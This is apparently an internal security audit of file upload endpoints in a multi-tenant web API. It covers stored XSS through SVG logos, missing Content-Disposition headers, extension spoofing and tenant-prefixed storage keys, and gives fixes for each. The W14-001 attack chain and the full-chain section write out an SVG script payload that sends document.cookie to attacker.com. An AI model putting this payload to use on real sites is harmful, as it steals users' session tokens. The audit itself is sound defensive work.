# W14 — Upload Security Audit

**Audited:** 2026-04-29
**Scope:** All file upload endpoints, MIME validation, storage key construction, Content-Disposition, SVG/XSS risk
**Status:** Read-only audit — no files modified

---

## Summary

Five findings identified: two P0s (SVG upload allowed for branding logo → stored XSS via inline serving; all files served without Content-Disposition), two P1s (user-controlled extension; storage keys not tenant-prefixed), and one P2 (MIME filter passes SVG).

---

## Findings

### W14-001 — Branding logo upload allows SVG; served inline → Stored XSS (P0)
- **Severity:** P0
- **File:** `apps/api/src/tenants/tenants.controller.ts:144`, `apps/api/src/uploads/uploads.controller.ts:63-66`
- **Issue:** The logo upload endpoint (`POST /tenants/logo`) explicitly allows `image/svg+xml` in its MIME allowlist. The file is stored to disk/R2. When any user later loads the branded UI or invoice PDF, the logo is fetched via `GET /uploads/tenants/{tenantId}/logo.svg` — served inline with `Content-Type: image/svg+xml` and no `Content-Disposition: attachment`. A malicious SVG with embedded `<script>` or `<img onerror>` tags executes JavaScript in every operator's and buyer's browser session when the branding logo loads.
- **Evidence:**
  - `tenants.controller.ts:144`: `const allowed = ["image/png", "image/jpeg", "image/svg+xml", "image/webp"]`
  - `uploads.controller.ts:63-64`: `const contentType = mime.lookup(resolved) || "application/octet-stream"` with `res.setHeader("Content-Type", contentType)` — no Content-Disposition
- **Attack chain:**
  1. Attacker registers as a tenant operator (or compromises one)
  2. Uploads `logo.svg` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>document.location='https://attacker.com/?c='+document.cookie</script></svg>`
  3. Any user who loads the dashboard or invoice PDF sees the branding logo
  4. Browser executes the embedded script → session cookie exfiltrated
- **Impact:** Stored XSS affecting all users of the compromised tenant. Session tokens leaked to attacker.
- **Fix:** Remove `image/svg+xml` from the logo allowlist. If SVG support is required, sanitize with DOMPurify or svg-sanitize before storage. Always serve with `Content-Disposition: attachment` for non-display contexts.

---

### W14-002 — All uploaded files served inline without Content-Disposition: attachment (P0)
- **Severity:** P0
- **File:** `apps/api/src/uploads/uploads.controller.ts:63-66`
- **Issue:** Every file type (PDF, SVG, HTML, etc.) is served with only `Content-Type` set and no `Content-Disposition` header. Browsers render renderable formats (SVG, HTML, PDF) inline in the browser context rather than downloading them. This enables XSS via any uploaded renderable file type that bypasses the MIME filter, and also means user-uploaded PDFs with embedded JavaScript execute in the browser (though modern browsers restrict PDF JS).
- **Evidence:** `uploads.controller.ts:63-66` — `res.setHeader("Content-Type", contentType)` and `res.setHeader("Cache-Control", ...)` only. No `Content-Disposition`.
- **Fix:** Add `res.setHeader("Content-Disposition", "attachment; filename=\"" + path.basename(resolved) + "\"")` for all non-image file types. For images, optionally allow inline but strip SVG or require sanitization.

---

### W14-003 — File extension derived from user-controlled `originalname` → extension spoofing (P1)
- **Severity:** P1
- **File:** `apps/api/src/customers/customers.service.ts:1864`, `apps/api/src/products/products.service.ts:111`
- **Issue:** Multiple services derive the stored file extension from the user-supplied `originalname` field:
  - `customers.service.ts:1864`: `const ext = (originalName.split(".").pop() ?? "jpg").toLowerCase()`
  - `products.service.ts:111`: `const ext = originalName.split(".").pop() ?? "jpg"`
  An attacker uploads a file with `originalname = "payload.svg"` but `Content-Type: image/jpeg`. The MIME check passes (it's `image/jpeg`), but the stored key gets `.svg` extension. When served, `mime.lookup` on the `.svg` extension returns `image/svg+xml` → inline SVG execution.
- **Fix:** Derive extension from the validated MIME type using a lookup table (`mime.extension(file.mimetype)`), not from user-supplied filename. Never trust `originalname` for security decisions.

---

### W14-010 — Storage keys not prefixed with tenantId — cross-tenant file access possible (P1)
- **Severity:** P1
- **File:** `apps/api/src/products/products.service.ts:112`, `apps/api/src/customers/customers.service.ts:1865`
- **Issue:** Storage keys are constructed as `products/{productId}/{uuid}.{ext}` and `customers/{customerId}/tax-documents/{uuid}.{ext}` — there is no `tenantId` prefix. Since `productId` and `customerId` are UUIDs and tenant isolation in the DB is enforced by `forTenant()`, a product from tenant A will never collide with tenant B's product in the DB. However, in local storage mode, the upload directory is shared. In R2, the bucket is shared. If tenant A's operator somehow obtains tenant B's product UUID (e.g. via an IDOR in a different endpoint), they can access tenant B's product image via `/uploads/products/{uuid}.jpg`.
- **Fix:** Prefix all keys with `tenants/{tenantId}/` to enforce storage-level tenant isolation.

---

### W14-007 — Product image upload MIME filter: `mimetype.startsWith("image/")` passes SVG (P2)
- **Severity:** P2
- **File:** `apps/api/src/products/products.controller.ts:103-105`
- **Issue:** Product image upload uses `file.mimetype.startsWith("image/")` as its filter. This passes `image/svg+xml`. Combined with W14-003 (extension from originalname), an attacker can upload an SVG as a product image which then executes in any user's browser who views the product page.
- **Evidence:** `products.controller.ts:104`: `cb(null, file.mimetype.startsWith("image/"))`
- **Fix:** Use an explicit allowlist: `["image/jpeg", "image/png", "image/webp", "image/gif"]`. Same fix applies to `customers.controller.ts:385`.

---

## SVG XSS — Full Attack Chain

```
1. Attacker creates/controls an operator account
2. POST /tenants/logo  (multipart, file.mimetype = "image/svg+xml")
   → tenants.controller.ts:144 allows "image/svg+xml"
   → tenants.service.ts stores to key "tenants/{tenantId}/logo.svg"

3. Any user loads the operator dashboard
   → UI fetches GET /uploads/tenants/{tenantId}/logo.svg
   → uploads.controller.ts:63 sets Content-Type: image/svg+xml (no attachment)
   → Browser renders SVG inline in page context

4. Embedded <script>fetch('https://attacker.com/?c='+document.cookie)</script> executes
   → All user session tokens captured
```

**CVSS v3.1 estimate: 8.3 (High)** — network-exploitable, low complexity, no user interaction beyond page load, confidentiality/integrity HIGH.

---

## Summary Table

| ID | Severity | Title |
|----|----------|-------|
| W14-001 | P0 | SVG allowed in logo upload + served inline = Stored XSS |
| W14-002 | P0 | All files served without Content-Disposition: attachment |
| W14-003 | P1 | Extension from user-controlled originalname → extension spoofing |
| W14-010 | P1 | Storage keys not tenant-prefixed → cross-tenant file access |
| W14-007 | P2 | `mimetype.startsWith("image/")` filter passes SVG on product upload |
